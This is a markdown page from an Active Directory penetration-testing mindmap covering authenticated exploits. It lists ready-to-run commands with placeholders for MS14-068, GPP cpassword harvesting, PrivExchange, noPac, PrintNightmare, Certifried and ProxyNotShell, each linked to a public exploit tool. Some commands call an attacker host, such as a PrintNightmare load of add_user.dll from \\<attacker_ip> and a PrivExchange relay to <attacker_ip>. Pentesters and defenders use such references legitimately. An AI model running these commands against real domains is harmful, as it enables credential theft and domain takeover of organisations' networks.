---
title: "Known Vulnerabilities (Authenticated)"
category: cve
color: "#FAD7AC"
tags:
  - ad-mindmap
  - cve
---

# 🐛 Known Vulnerabilities (Authenticated)

> [!info] Mindmap box `Know vulnerabilities authenticated`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## MS14-068
➡️ [[Lateral Movement|PTT]] → [[Domain Admin|Domain admin]] / [[Admin Access|Admin]]

- `findSMB2UPTime.py <ip>` [↗](https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py)
    - `ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>` [↗](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/pykek/ms14-068.py)
    - `msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum` [↗](https://docs.metasploit.com/)
    - `goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target` [↗](https://github.com/fortra/impacket/blob/master/examples/goldenPac.py)

## GPP MS14-025
➡️ [[Domain Admin|Domain admin]]

- `msf> use auxiliary/scanner/smb/smb_enum_gpp` [↗](https://docs.metasploit.com/)
- `findstr /S /I cpassword \\<domain_fqdn>\sysvol\<domain_fqdn>\policies\*.xml` [↗](https://lolbas-project.github.io/lolbas/Binaries/Findstr/)
- `Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>` [↗](https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py)

## PrivExchange (CVE-2019-0724, CVE-2019-0686)
➡️ [[Man In The Middle|HTTP Coerce]] → [[Domain Admin|Domain admin]] / [[Admin Access|Admin]]

- `privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>` [↗](https://github.com/dirkjanm/PrivExchange)

## noPac (CVE-2021-42287, CVE-2021-42278)
➡️ [[Lateral Movement|PTT]] → [[ACLs & ACEs Permissions|DCSYNC]] → [[Domain Admin|Domain admin]]

- `nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan` [↗](https://github.com/Pennyw0rth/NetExec)
- `noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt` [↗](https://github.com/cube0x0/noPac)

## PrintNightmare (CVE-2021-1675, CVE-2021-34527)
➡️ [[Admin Access|Admin]]

- `nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan` [↗](https://github.com/Pennyw0rth/NetExec)
- `printnightmare.py -dll '\\<attacker_ip>\smb\add_user.dll' '<user>:<password>@<ip>'` [↗](https://github.com/ly4k/PrintNightmare/blob/main/printnightmare.py)

## Certifried (CVE-2022-26923)
➡️ [[Lateral Movement|PTT]] → [[ACLs & ACEs Permissions|DCSYNC]] → [[Domain Admin|Domain admin]]

- Create account
    - `certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'` [↗](https://github.com/ly4k/Certipy)
- Request
    - `certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine` [↗](https://github.com/ly4k/Certipy)
- Authentication
    - `certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)

## ProxyNotShell (CVE-2022-41040, CVE-2022-41082)
➡️ [[Admin Access|Admin]]

- `poc_aug3.py <host> <username> <password> <command>` [↗](https://github.com/testanull/ProxyNotShell-PoC/)
